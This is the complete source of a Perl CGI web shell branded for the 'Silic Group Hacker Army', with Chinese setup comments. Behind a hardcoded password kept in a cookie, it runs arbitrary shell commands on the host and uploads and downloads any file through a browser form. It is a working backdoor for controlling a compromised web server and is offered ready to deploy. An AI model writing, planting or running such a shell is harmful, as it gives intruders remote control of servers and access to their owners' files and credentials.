#!/usr/bin/perl -I/usr/local/bandmin
# 第一行指向正确(大部分不需修改),错误则500,未安装不解析
# 如果是Win服务器,设置$WinNT=1;
# 设置本文件属性为755
$Password="silic";
$WinNT=0;
$NTCmdSep="&";
$UnixCmdSep=";";
$CommandTimeoutDuration=50;
$ShowDynamicOutput=1;
$CmdSep=($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd=($WinNT ? "cd" : "pwd");
$PathSep=($WinNT ? "\\" : "/");
$Redirector=($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
sub ReadParse{
	local(*in)=@_ if @_;
	local($i,$loc,$key,$val);
	$MultipartFormData=$ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;
	if($ENV{'REQUEST_METHOD'} eq "GET"){$in=$ENV{'QUERY_STRING'};}
	elsif($ENV{'REQUEST_METHOD'} eq "POST"){binmode(STDIN) if $MultipartFormData & $WinNT;read(STDIN, $in, $ENV{'CONTENT_LENGTH'});}
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/){
		$Boundary='--'.$1;
		@list=split(/$Boundary/,$in); 
		$HeaderBody=$list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header=$`;
		$Body=$';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'}=$Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'}=$1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;
		for($i=2; $list[$i]; $i++){ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key=$1;
			$val=$';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key}=$val;}}
	else{
		@in=split(/&/, $in);
		foreach $i (0 .. $#in){
			$in[$i] =~ s/\+/ /g;
			($key, $val)=split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;}}
}
sub PrintPageHeader{
$EncodedCurrentDir=$CurrentDir;
$EncodedCurrentDir =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
print "Content-type: text/html\n\n";
print <<END;
<html><head>
<title>Silic Group Hacker Army - BlackBap.Org</title>
$HtmlMetaHeader
</head>
<body onLoad="document.f.@_.focus()" style="background:#AAAAAA;" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<table style="width:955px;" align="center" border="0" cellspacing="0" cellpadding="2">
<tr><td bgcolor="#293F5F"><font face="Verdana" size="2" color="#FFFFFF"><b>&nbsp;&#8857;&nbsp;$ServerName:$ENV{'SERVER_PORT'} - $ENV{'SERVER_SOFTWARE'} - $ENV{'GATEWAY_INTERFACE'}</b></font></td></tr>
<tr>
	<td colspan="2" bgcolor="#FFFFE0"><font color="#FF0000" size="2">
	&nbsp;&nbsp;<a href="$ScriptLocation?a=upload&d=$EncodedCurrentDir">&#25991;&#20214;&#19978;&#20256;</a> | 
	<a href="$ScriptLocation?a=download&d=$EncodedCurrentDir">&#25991;&#20214;&#19979;&#36733;</a> |
	<a href="$ScriptLocation?a=logout">&#27880;&#38144;&#30331;&#24405;</a> |
	power by <a href="http://blackbap.org" target="_blank">Silic Group</a>
</font></td></tr>
<tr><td>
<font color="#006633" size="3">
END
}
sub PrintLoginScreen{$Message;}
sub PrintLoginFailedMessage{print "<code>Login Failed,Wrong Password,Do You Want Try Again...  //BlackBap.Org</code>";}
sub PrintLoginForm{
print <<END;
<center>
<form name="f" method="POST" action="$ScriptLocation">
<div style="width:351px;height:201px;margin-top:100px;background:threedface;border-color:#FFFFFF #999999 #999999 #FFFFFF;border-style:solid;border-width:1px;">
<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#293F5F;clear:both;"><b>Login</b></div>
<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">PASS:<input type="password" name="p" style="width:270px;"></div>
<div style="width:350px;height:30px;clear:both;"><input type="submit" name="a" value="LOGIN" style="width:80px;"></div>
</div>
</form>
</center>
END
}
sub PrintPageFooter{print "</font></td></tr></table></body></html>";}
sub GetCookies{@httpcookies=split(/; /,$ENV{'HTTP_COOKIE'});
foreach $cookie(@httpcookies){($id, $val)=split(/=/, $cookie);$Cookies{$id}=$val;}}
sub PrintLogoutScreen{print "<code>Logout Success...  //BlackBap.Org<br><br></code>";}
sub PerformLogout{
	print "Set-Cookie: SAVEDPWD=;\n";
	&PrintPageHeader("p");
	&PrintLogoutScreen;
	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
}
sub PerformLogin {
	if($LoginPassword eq $Password){
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&PrintPageHeader("c");
		&PrintCommandLineInputForm;
		&PrintPageFooter;
	}else{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne ""){&PrintLoginFailedMessage;}
		&PrintLoginForm;
		&PrintPageFooter;
	}
}
sub PrintCommandLineInputForm{
$Prompt=$WinNT ? "$CurrentDir> ":"[Silic\@$ServerName $CurrentDir]\$ ";
print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="command">
<input type="hidden" name="d" value="$CurrentDir">
$Prompt
<input type="text" name="c" style="width:550px;">
</form>
</code>
END
}
sub PrintFileDownloadForm{
$Prompt=$WinNT ? "$CurrentDir> " : "[r00t\@$ServerName $CurrentDir]\$ ";
print <<END;
<code>
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename: <input type="text" name="f" size="35"><br><br>
Download: <input type="submit" value="Begin">
</form>
</code>
END
}
sub PrintFileUploadForm{
$Prompt=$WinNT ? "$CurrentDir> " : "[r00t\@$ServerName $CurrentDir]\$ ";
print <<END;
<code>
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename: <input type="file" name="f" size="35"><br><br>
Options: &nbsp;<input type="checkbox" name="o" value="overwrite">
Overwrite if it Exists<br><br>
Upload:&nbsp;&nbsp;&nbsp;<input type="submit" value="Begin">
<input type="hidden" name="d" value="$CurrentDir">
<input type="hidden" name="a" value="upload">
</form>
</code>
END
}
sub CommandTimeout{
if(!$WinNT){
alarm(0);
print <<END;
</xmp>
<code>
Command exceeded maximum time of $CommandTimeoutDuration second(s).
<br>Killed it!
<code>
END
&PrintCommandLineInputForm;
&PrintPageFooter;
exit;}
}
sub ExecuteCommand{
	if($RunCommand =~ m/^\s*cd\s+(.+)/){
		$OldDir=$CurrentDir;
		$Command="cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chop($CurrentDir=`$Command`);
		&PrintPageHeader("c");
		$Prompt=$WinNT ? "$OldDir> " : "[r00t\@$ServerName $OldDir]\$ ";
		print "<code>$Prompt $RunCommand</code>";
	}else{
		&PrintPageHeader("c");
		$Prompt=$WinNT ? "$CurrentDir> " : "[r00t\@$ServerName $CurrentDir]\$ ";
		print "<code>$Prompt $RunCommand</code><xmp>";
		$Command="cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
		if(!$WinNT){$SIG{'ALRM'}=\&CommandTimeout;alarm($CommandTimeoutDuration);}
		if($ShowDynamicOutput){
			$|=1;
			$Command .= " |";
			open(CommandOutput, $Command);
			while(<CommandOutput>){$_ =~ s/(\n|\r\n)$//;print "$_\n";}
			$|=0;
		}else{print `$Command`;}
		if(!$WinNT){alarm(0);}
		print "</xmp>";
	}
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}
sub PrintDownloadLinkPage{
local($FileUrl)=@_;
if(-e $FileUrl){
	$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
	$DownloadLink="$ScriptLocation?a=download&f=$FileUrl&o=go";
	$HtmlMetaHeader="<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
	&PrintPageHeader("c");
print <<END;
<code>
Sending File $TransferFile...<br>
If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>.
</code>
END
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}else{
		&PrintPageHeader("f");
		print "<code>&#19979;&#36733;&#22833;&#36133; $FileUrl: $!</code>";
		&PrintFileDownloadForm;
		&PrintPageFooter;}
}
sub SendFileToBrowser{
	local($SendFile)=@_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{if($WinNT){binmode(SENDFILE);binmode(STDOUT);}
		$FileSize=(stat($SendFile))[7];
		($Filename=$SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
	}
	else{
		&PrintPageHeader("f");
		print "<code>&#19979;&#36733;&#22833;&#36133; $SendFile: $!</code>";
		&PrintFileDownloadForm;
		&PrintPageFooter;
	}
}
sub BeginDownload{
if(($WinNT & ($TransferFile =~ m/^\\|^.:/))|(!$WinNT & ($TransferFile =~ m/^\//))){$TargetFile=$TransferFile;}
else{chop($TargetFile) if($TargetFile=$CurrentDir) =~ m/[\\\/]$/;$TargetFile .= $PathSep.$TransferFile;}
if($Options eq "go"){&SendFileToBrowser($TargetFile);}else{&PrintDownloadLinkPage($TargetFile);}
}
sub UploadFile{
if($TransferFile eq ""){&PrintPageHeader("f");&PrintFileUploadForm;&PrintPageFooter;return;}
	&PrintPageHeader("c");
	print "<code>Uploading $TransferFile to $CurrentDir...<br>";
	chop($TargetName) if ($TargetName=$CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;
	$TargetFileSize=length($in{'filedata'});
	if(-e $TargetName && $Options ne "overwrite"){print "Failed:&#30446;&#26631;&#25991;&#20214;&#24050;&#23384;&#22312;...<br>";
	}else{
		if(open(UPLOADFILE, ">$TargetName")){
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			print "Transfered $TargetFileSize Bytes.<br>";
			print "File Path: $TargetName<br>";
		}else{print "Failed: $!<br>";}
	}
	print "</code>";
	&PrintCommandLineInputForm;
	&PrintPageFooter;
}
sub DownloadFile{
	if($TransferFile eq ""){&PrintPageHeader("f");&PrintFileDownloadForm;&PrintPageFooter;return;}
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/))|(!$WinNT & ($TransferFile =~ m/^\//))){$TargetFile=$TransferFile;}
	else{chop($TargetFile) if($TargetFile=$CurrentDir) =~ m/[\\\/]$/;$TargetFile .= $PathSep.$TransferFile;}
	if($Options eq "go"){&SendFileToBrowser($TargetFile);}
	else{&PrintDownloadLinkPage($TargetFile);}
}
&ReadParse;
&GetCookies;
$ScriptLocation=$ENV{'SCRIPT_NAME'};
$ServerName=$ENV{'SERVER_NAME'};

$LoginPassword=$in{'p'};
$RunCommand=$in{'c'};
$TransferFile=$in{'f'};
$Options=$in{'o'};
$Action=$in{'a'};
$Action="LOGIN" if($Action eq "");
$CurrentDir=$in{'d'};
chop($CurrentDir=`$CmdPwd`) if($CurrentDir eq "");
$LoggedIn=$Cookies{'SAVEDPWD'} eq $Password;
if($Action eq "LOGIN" || !$LoggedIn){&PerformLogin;}
elsif($Action eq "command"){&ExecuteCommand;}
elsif($Action eq "upload"){&UploadFile;}
elsif($Action eq "download"){&DownloadFile;}
elsif($Action eq "logout"){&PerformLogout;}